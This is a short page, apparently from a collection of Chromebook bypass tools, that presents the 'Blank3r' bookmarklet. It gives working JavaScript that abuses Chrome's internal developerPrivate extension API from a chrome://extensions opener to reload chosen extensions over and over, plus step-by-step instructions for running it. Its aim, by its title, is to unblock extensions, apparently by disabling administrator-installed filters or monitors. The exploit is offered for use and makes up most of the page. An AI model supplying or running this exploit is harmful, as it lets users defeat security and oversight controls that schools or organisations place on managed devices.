---
title: unblock-extensions-blank3r
---

-e 
Reload extensions continuously with Blank3r!

Code:
javascript:let shim = false;var ids = prompt("Extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);

Instructions:
1. Bookmark the code above.
2. Navigate to chrome://extensions.
3. Click on an extension that is from the Chrome Web Store > Details.
4. In the URL bar, copy the string of letters and numbers after the /?id=.
5. Click "View in Chrome Web Store" and spam the escape key. If it loads into Chrome Webstore, try again.
If it is a blank screen, click the bookmarklet.
6. Paste the ID of the extension into the prompt separated by commas.
7. You're done!

Notes:
If you can't install extensions then you can't do this exploit.
If you close the tab, the exploit will stop working.

Credits:
CoolElectronics/velzie
Titanium Network